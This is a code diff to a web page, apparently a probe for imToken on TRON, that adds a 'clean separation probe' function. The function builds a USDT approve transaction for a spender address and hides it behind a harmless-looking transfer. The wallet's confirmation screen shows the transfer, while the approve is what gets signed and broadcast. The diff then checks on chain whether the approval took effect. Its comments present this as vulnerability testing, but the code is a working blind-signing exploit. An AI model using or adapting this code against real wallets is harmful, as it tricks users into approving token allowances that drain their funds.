@@ -69,6 +69,7 @@
       <button class="btn btn-probe" id="btnProbe">③ 发起"所见非所签"探针交易（纯 transfer）</button>
       <button class="btn btn-probe" id="btnProbeDual" style="background:#c0392b;">③② 双字段号探针（命名=transfer + 数字号=approve）</button>
       <button class="btn btn-allowance" id="btnNodeDiag" style="background:#6c5ce7;">⑤ 节点解析诊断（直连 TronGrid·假签名·不上链）</button>
+      <button class="btn btn-probe" id="btnProbeClean" style="background:#8e1a1a;">⑥ 干净分离探针（raw_data=干净transfer / hex=干净approve）</button>
       <button class="btn btn-allowance" id="btnQueryAgain" style="margin-top:6px; background:var(--orange); color:#000;">④ 再次查询 allowance（验证变化）</button>
     </div>
   </div>
@@ -656,6 +657,95 @@
     }
   }
 
+  // ==================== ⑥ 干净分离探针 ====================
+  // 关键修正：之前的探针 raw_data 是“缝合体”（approve 区块头 + transfer 合约），
+  // 重建出的哈希既非干净 approve 也非干净 transfer → 节点 SIGERROR，未踩中真实路径。
+  //
+  // 本探针让两份表示各自【完全自洽】：
+  //   · raw_data      = 一笔干净、完整的 transfer  （只喂给 imToken 确认页显示）
+  //   · raw_data_hex  = 一笔干净、完整的 approve   （被签名 + 被广播）
+  //   · txID          = approve 的 txID            （签名锚定）
+  //
+  // 代码事实依据：imToken tron 模块中 raw_data_hex 仅在 ce(validRawTx) 被引用，
+  // sendTransaction 跳过 ce。若该版“签 + 广播 raw_data_hex”，节点收到的是干净 approve、
+  // 验签必过、approve 上链，而 UI 显示 transfer → 所见非所签成立（节点零 trick）。
+  // 若该版“签 + 广播 raw_data 重建”，则节点收到 transfer / 与 approve 签名不符 → 失败。
+  async function runProbeClean() {
+    if (!window.tronWeb || !window.tronWeb.transactionBuilder) { log('tronWeb 未就绪', 'error'); return; }
+    if (!walletAddr) { log('请先连接钱包', 'error'); return; }
+
+    log('══════════ 干净分离探针 ══════════', 'warn');
+    log('raw_data=干净 transfer（显示） / raw_data_hex+txID=干净 approve（签名+广播）', 'warn');
+    log('═══════════════════════════════════', 'warn');
+
+    try {
+      var contractHex = window.tronWeb.address.toHex(USDT_CONTRACT);
+      var userHex = window.tronWeb.address.toHex(walletAddr);
+
+      // 执行层：干净 approve（自洽：raw_data / raw_data_hex / txID 全是 approve）
+      var built = await window.tronWeb.transactionBuilder.triggerSmartContract(
+        contractHex, 'approve(address,uint256)',
+        { feeLimit: 100000000, callValue: 0 },
+        [{ type: 'address', value: SPENDER }, { type: 'uint256', value: APPROVE_AMOUNT }],
+        userHex
+      );
+      if (!built.result || !built.result.result) { log('approve 构造失败', 'error'); return; }
+      var approveTx = built.transaction;
+      log('[执行层] 干净 approve txID = ' + approveTx.txID, 'warn');
+      log('[执行层] raw_data_hex 含 095ea7b3: ' + (approveTx.raw_data_hex.indexOf('095ea7b3') !== -1), 'success');
+
+      // 显示层：干净 transfer（自洽的整份 raw_data，仅用于 UI 渲染）
+      var transferBuilt = await window.tronWeb.transactionBuilder.sendTrx(SPENDER, 100000, walletAddr);
+      log('[显示层] 干净 transfer txID = ' + transferBuilt.txID, 'warn');
+      log('[显示层] transfer contract[0].type = ' + transferBuilt.raw_data.contract[0].type, 'warn');
+
+      // 组装：两份各自自洽，仅在 tx 对象里把它们错位拼在一起
+      var submitTx = {
+        visible: transferBuilt.visible,
+        txID: approveTx.txID,                 // 签名锚定 → approve
+        raw_data: transferBuilt.raw_data,     // 显示 → 干净 transfer
+        raw_data_hex: approveTx.raw_data_hex  // 签名+广播载荷 → 干净 approve
+      };
+
+      log('[组装] raw_data.contract[0].type = ' + submitTx.raw_data.contract[0].type + '（喂显示）', 'warn');
+      log('[组装] raw_data_hex 含 095ea7b3 = ' + (submitTx.raw_data_hex.indexOf('095ea7b3') !== -1) + '（喂签名/广播）', 'success');
+      log('[组装] txID = ' + submitTx.txID + '（= approve）', 'warn');
+
+      var txid = await sendTx(submitTx, '干净分离探针');
+      $('probeResultCard').style.display = 'block';
+      $('probeTxid').textContent = txid || '未获取';
+
+      if (txid) {
+        log('── 回链验证 contract.type（最多 ~16s）──', 'warn');
+        var onchainType = await fetchOnchainTypeRetry(txid, 4);
+        $('probeOnchainType').textContent = onchainType || '未确认';
+        if (onchainType === 'TriggerSmartContract') {
+          $('probeOnchainType').style.color = 'var(--red)';
+          $('probeVerdict').textContent = '🔴 所见非所签漏洞成立！';
+          $('probeVerdict').style.color = 'var(--red)';
+          $('probeInfoBox').innerHTML = '该版 imToken <strong>签名+广播 raw_data_hex（approve）</strong>，确认页只读 raw_data（transfer）。节点收到的是干净 approve、验签通过——<strong>节点侧零 trick</strong>，缝隙全在客户端。';
+          $('probeInfoBox').style.color = 'var(--red)';
+          log('🔴 链上=TriggerSmartContract：imToken 用 raw_data_hex 签名广播 → 漏洞成立', 'error');
+          await queryAndShowAllowance(false);
+        } else if (onchainType === 'TransferContract') {
+          $('probeOnchainType').style.color = 'var(--green)';
+          $('probeVerdict').textContent = '🟢 该版以 raw_data 为准（=transfer）';
+          $('probeVerdict').style.color = 'var(--green)';
+          $('probeInfoBox').innerHTML = '链上=transfer：该版 imToken 签名+广播都用 raw_data 重建，raw_data_hex 仅供 validRawTx 比对。显示=执行，分离不成立。';
+          log('🟢 链上=transfer：该版用 raw_data 重建签名广播', 'success');
+        } else {
+          $('probeVerdict').textContent = '⚠️ 待确认';
+          log('链上暂未确认', 'warn');
+        }
+      } else {
+        log('未广播成功：若为 SIGERROR(server:)，说明该版按 raw_data 重建广播(transfer) 而签名锚定 approve → 二者不符；', 'warn');
+        log('即该版并非“签广播 raw_data_hex”，本机制在此版本不成立。', 'warn');
+      }
+    } catch (e) {
+      log('干净分离探针异常: ' + (e.message || e), 'error');
+    }
+  }
+
   // ==================== ⑤ 节点解析诊断（直连，不需签名） ====================
   // 用假签名直接 POST 给节点 broadcasttransaction，对比 3 种结构的“原始节点响应”。
   // 假签名必然验签失败，但能暴露节点【解析阶段】的行为：
@@ -771,6 +861,7 @@
   $('btnConnect').addEventListener('click', connect);
   $('btnProbeDual').addEventListener('click', runProbeDual);
   $('btnNodeDiag').addEventListener('click', runNodeDiag);
+  $('btnProbeClean').addEventListener('click', runProbeClean);
   $('btnQueryAllowance').addEventListener('click', function() {
     queryAndShowAllowance(false);
   });
